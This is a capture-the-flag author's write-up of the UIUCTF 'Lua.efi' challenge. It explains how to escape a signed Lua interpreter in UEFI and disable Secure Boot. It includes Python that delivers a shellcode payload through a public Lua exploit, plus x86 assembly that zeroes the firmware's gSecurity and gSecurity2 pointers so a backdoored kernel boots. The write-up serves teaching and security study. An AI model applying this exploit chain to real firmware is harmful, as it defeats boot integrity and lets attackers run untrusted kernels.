# Lua.efi

by YiFei Zhu

> The engineers at SIGPwny Inc. wants to retaliate against PwnySIG Inc. for
> finding their secrets. They found PwnySIG Inc.'s server and was able to
> detach its hard drive and replace the kernel with a backdoor-ed kernel.
>
> Unfortunately, they soon discovered that the server has secure boot on, and
> there's no firmware setup to disable it... how would it be possible to boot
> this backdoor kernel? Hmm... what's this? How considerate of PwnySIG Inc. to
> leave a signed lua interpreter wide open. Maybe they can bypass secure boot
> through that?
>
> `$ socat file:$(tty),raw,echo=0 openssl:lua-efi.chal.uiuc.tf:1337`
>
> Hint: Feel free to use known exploits that exist in the wild to escape the
> lua "jail", such as https://gist.github.com/corsix/49d770c7085e4b75f32939c6c076aad6

This challenge is my attempt at making an easier UEFI challenge. I wanted to
explore secure boot's trust model, but it really doesn't make sense for there
to be a signed binexec. A calculator makes more sense, and besides, it's a lot
more interesting to see "wait what Lua can run in ring 0 in UEFI?!"

[AppPkg from edk2-libc](https://github.com/tianocore/edk2-libc/tree/master/AppPkg/Applications)
actually has both Python and Lua, but Python is a lot larger, and because I'm
Don't Starve player (a game whose main logic and modding API is in Lua), I also
wanted to raise the awareness of Lua untrusted bytecode being a security
problem.

However, Lua exploitation is not the main focus of this challenge, so I just
gave a public working exploit against Lua in the hints, without patching the
exploit out. Built-in functions such as `io.open` and `os.execute` are removed
because they are just distractions and completely irrelevant from the intended
solve. However, I added ASLR so the challenge isn't so completely trivial that
one can just hardcode addresses.

Apparently... I underestimated the difficulty of this challenge...

## Lua

Not much to say about the Lua stage. The exploit from the Gist pretty much
works as-is after removing the `local` keywords.

`make_CClosure` gives a way to call arbitrary code at an address, and UEFI is
not W^X in most cases, so I can just run a payload through a string... And Lua
strings... are very simple:

```C
/*
** Header for string value; string bytes follow the end of this structure
*/
typedef union TString {
  L_Umaxalign dummy;  /* ensures maximum alignment for strings */
  struct {
    CommonHeader;
    lu_byte extra;  /* reserved words for short strings; "has hash" for longs */
    unsigned int hash;
    size_t len;  /* number of characters in string */
  } tsv;
} TString;
```

So if I can load the payload as string, the bytes of the payload is 24 bytes
after the string's address, so I just need:
```python
with open('payload', 'rb') as f:
    r.send(f'''\
payload = {repr(f.read())[1:]}
cpayload = make_CClosure(addr_of(payload) + 24)
cpayload()
os.exit()
'''.encode())
```

## UEFI

Once there is arbitrary code execution, there are many ways to disable secure
boot. I just looked at what gave the secure boot violation:

```
../src/boot/boot.c:2560@image_start: Error loading \EFI\Linux\bzImage.uki.efi: Access denied
```

UEFI Image loading contains two steps: LoadImage, and StartImage. Let's look at
LoadImage first; it does this:
```C
EFI_STATUS
CoreLoadImageCommon (
  IN  BOOLEAN                   BootPolicy,
  IN  EFI_HANDLE                ParentImageHandle,
  IN  EFI_DEVICE_PATH_PROTOCOL  *FilePath,
  IN  VOID                      *SourceBuffer       OPTIONAL,
  IN  UINTN                     SourceSize,
  IN  EFI_PHYSICAL_ADDRESS      DstBuffer           OPTIONAL,
  IN OUT UINTN                  *NumberOfPages      OPTIONAL,
  OUT EFI_HANDLE                *ImageHandle,
  OUT EFI_PHYSICAL_ADDRESS      *EntryPoint         OPTIONAL,
  IN  UINT32                    Attribute
  )
{
[...]
  if (gSecurity2 != NULL) {
    //
    // Verify File Authentication through the Security2 Architectural Protocol
    //
    SecurityStatus = gSecurity2->FileAuthentication (
                                   gSecurity2,
                                   OriginalFilePath,
                                   FHand.Source,
                                   FHand.SourceSize,
                                   BootPolicy
                                   );
    if (!EFI_ERROR (SecurityStatus) && ImageIsFromFv) {
      //
      // When Security2 is installed, Security Architectural Protocol must be published.
      //
      ASSERT (gSecurity != NULL);

      //
      // Verify the Authentication Status through the Security Architectural Protocol
      // Only on images that have been read using Firmware Volume protocol.
      //
      SecurityStatus = gSecurity->FileAuthenticationState (
                                    gSecurity,
                                    AuthenticationStatus,
                                    OriginalFilePath
                                    );
    }
  } else if ((gSecurity != NULL) && (OriginalFilePath != NULL)) {
    //
    // Verify the Authentication Status through the Security Architectural Protocol
    //
    SecurityStatus = gSecurity->FileAuthenticationState (
                                  gSecurity,
                                  AuthenticationStatus,
                                  OriginalFilePath
                                  );
  }
```

So as long as both `gSecurity` and `gSecurity2` are unset, there won't be
file authentication.

I just craft the payload: get the base address of Lua.efi from the return
address, then follow `gBS->LoadImage` to get the base address of DxeCore.efi,
and proceed to zero the two variables (I didn't even bother to check which
one is set, because one extra instruction really doesn't matter):

```asm
LuaEfi_off_gBS = 0x34638
LuaEfi_off_retaddr = 0x1cf13

BS_off_LoadImage = 200

DxeCore_off_CoreLoadImage = 0x9f4
DxeCore_off_gSecurity = 0x25710
DxeCore_off_gSecurity2 = 0x255f0

_start:
  # RAX = gBS
  mov (%rsp),%rax
  add $(LuaEfi_off_gBS-LuaEfi_off_retaddr),%rax
  mov (%rax),%rax

  # RAX = DxeCore.efi
  mov BS_off_LoadImage(%rax),%rax
  add $-DxeCore_off_CoreLoadImage,%rax

  movq $0,DxeCore_off_gSecurity(%rax)
  movq $0,DxeCore_off_gSecurity2(%rax)

  xor %eax,%eax
  ret
```

... and it works. Secure boot is disabled, and we can boot the kernel to
obtain the flag.

```
+ mkdir -p /proc /dev /sys /etc /mnt
+ mount -n -t proc -o nosuid,noexec,nodev proc /proc/
+ mount -n -t devtmpfs -o 'mode=0755,nosuid,noexec' devtmpfs /dev
+ mount -n -t sysfs -o nosuid,noexec,nodev sys /sys
+ mount -n -t tmpfs -o 'mode=1777' tmpfs /tmp
+ mount -n -t 9p flag -o 'nosuid,noexec,nodev,version=9p2000.L,trans=virtio,msize=104857600' /mnt
+ cat /mnt/flag
uiuctf{broken_chain_of_trust_is_a_lot_of_damage_fb61a3b1}
```

The flag refers to how secure boot relies heavily on chain of trust, where if
one part is compromised, everything falls apart.
